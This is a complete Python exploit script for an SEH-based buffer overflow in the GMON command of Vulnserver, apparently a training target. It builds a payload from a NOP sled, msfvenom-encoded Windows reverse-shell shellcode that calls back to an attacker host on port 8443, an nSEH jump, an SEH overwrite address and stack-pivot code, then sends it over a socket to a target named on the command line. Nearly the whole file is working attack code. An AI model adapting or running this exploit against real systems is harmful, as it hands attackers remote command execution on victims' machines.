#!/usr/bin/env python3

## SEH BASED BUFFER OVERFLOW IN GMON OPTION ON VULNSERVER ##

import socket
import sys
from struct import pack

## PAYLOAD MUST HAVE / TO TRIGGER DESIRED CONDITION
## SIZE MUST BE BIGGER THAN 0F6E
## HANDLER: 356F4534
## ADDRESS: 6F45336F

def sock_conn(t, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.settimeout(10)
        s.connect((t, p))
        return s

    except (socket.error, socket.timeout) as e:
        print(f"[-] Failed to connect to target: {e}")
        return None

def gen_payload():

    size = 0x1000
    nopsled = b'\x90' * 200

# msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=IP-ADDR LPORT=8443 exitfunc=thread -v shellcode -b '\x00' -f py
    shellcode =  b""
    shellcode += b"\xdb\xdf\xd9\x74\x24\xf4\x58\xbd\x3e\xfc\xc3"
    shellcode += b"\xe6\x31\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04"
    shellcode += b"\x03\x56\xef\x21\x13\x5a\xe7\x24\xdc\xa2\xf8"
    shellcode += b"\x48\x54\x47\xc9\x48\x02\x0c\x7a\x79\x40\x40"
    shellcode += b"\x77\xf2\x04\x70\x0c\x76\x81\x77\xa5\x3d\xf7"
    shellcode += b"\xb6\x36\x6d\xcb\xd9\xb4\x6c\x18\x39\x84\xbe"
    shellcode += b"\x6d\x38\xc1\xa3\x9c\x68\x9a\xa8\x33\x9c\xaf"
    shellcode += b"\xe5\x8f\x17\xe3\xe8\x97\xc4\xb4\x0b\xb9\x5b"
    shellcode += b"\xce\x55\x19\x5a\x03\xee\x10\x44\x40\xcb\xeb"
    shellcode += b"\xff\xb2\xa7\xed\x29\x8b\x48\x41\x14\x23\xbb"
    shellcode += b"\x9b\x51\x84\x24\xee\xab\xf6\xd9\xe9\x68\x84"
    shellcode += b"\x05\x7f\x6a\x2e\xcd\x27\x56\xce\x02\xb1\x1d"
    shellcode += b"\xdc\xef\xb5\x79\xc1\xee\x1a\xf2\xfd\x7b\x9d"
    shellcode += b"\xd4\x77\x3f\xba\xf0\xdc\x9b\xa3\xa1\xb8\x4a"
    shellcode += b"\xdb\xb1\x62\x32\x79\xba\x8f\x27\xf0\xe1\xc7"
    shellcode += b"\x84\x39\x19\x18\x83\x4a\x6a\x2a\x0c\xe1\xe4"
    shellcode += b"\x06\xc5\x2f\xf3\x69\xfc\x88\x6b\x94\xff\xe8"
    shellcode += b"\xa2\x53\xab\xb8\xdc\x72\xd4\x52\x1c\x7a\x01"
    shellcode += b"\xf4\x4c\xd4\xfa\xb5\x3c\x94\xaa\x5d\x56\x1b"
    shellcode += b"\x94\x7e\x59\xf1\xbd\x15\xa0\x92\x01\x41\xa5"
    shellcode += b"\x60\xea\x90\xb9\x44\x11\x1d\x5f\xee\xf5\x48"
    shellcode += b"\xc8\x87\x6c\xd1\x82\x36\x70\xcf\xef\x79\xfa"
    shellcode += b"\xfc\x10\x37\x0b\x88\x02\xa0\xfb\xc7\x78\x67"
    shellcode += b"\x03\xf2\x14\xeb\x96\x99\xe4\x62\x8b\x35\xb3"
    shellcode += b"\x23\x7d\x4c\x51\xde\x24\xe6\x47\x23\xb0\xc1"
    shellcode += b"\xc3\xf8\x01\xcf\xca\x8d\x3e\xeb\xdc\x4b\xbe"
    shellcode += b"\xb7\x88\x03\xe9\x61\x66\xe2\x43\xc0\xd0\xbc"
    shellcode += b"\x38\x8a\xb4\x39\x73\x0d\xc2\x45\x5e\xfb\x2a"
    shellcode += b"\xf7\x37\xba\x55\x38\xd0\x4a\x2e\x24\x40\xb4"
    shellcode += b"\xe5\xec\x60\x57\x2f\x19\x09\xce\xba\xa0\x54"
    shellcode += b"\xf1\x11\xe6\x60\x72\x93\x97\x96\x6a\xd6\x92"
    shellcode += b"\xd3\x2c\x0b\xef\x4c\xd9\x2b\x5c\x6c\xc8"

    target_prefix = b'GMON ' # Target prefix to exploit
    buffer = b'/' * (3551 - len(nopsled)- len(shellcode)) # +1 byte for alignment purposes
    nseh = b'\xeb\x06\x90\x90' # add sp,1500; jmp esp
    seh = pack('<L', 0x625011b3)
    jumpcode = b'\x66\x81\xC4\xDC\x05\xFF\xE4'
    extrabuff = b'\x41' * (size - len(buffer))

    payload = target_prefix + nopsled + shellcode + buffer + nseh + seh + jumpcode + extrabuff
    
    return payload


def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"Usage: {sys.argv[0]} [target-addr] [target-port]")
        print("If no port is given, the default 9999 port will be used")
        print(f"E. g. {sys.argv[0]} 172.16.1.4 8080")
        print(f"E. g. {sys.argv[0]} www.test.com")

    else:

        target = sys.argv[1]

        if len(sys.argv) == 2:
            port = 9999
        else:
            port = int(sys.argv[2])


        try:
            s = sock_conn(target, port)
            payload = gen_payload()
            if s:
                print("[*] Sending payload...\r\n")
                s.send(payload)
                resp = s.recv(1024)
                print("[+] Payload sent. Happy hacking.\r\n")

        except Exception as e:
            print(f"[-] Failed while sending payload: {e}")
            sys.exit(0)

        finally:
            if s:
                s.close()
            print("-- Obliterating your privacy, as usual ;)")

if __name__ == "__main__":
    main()
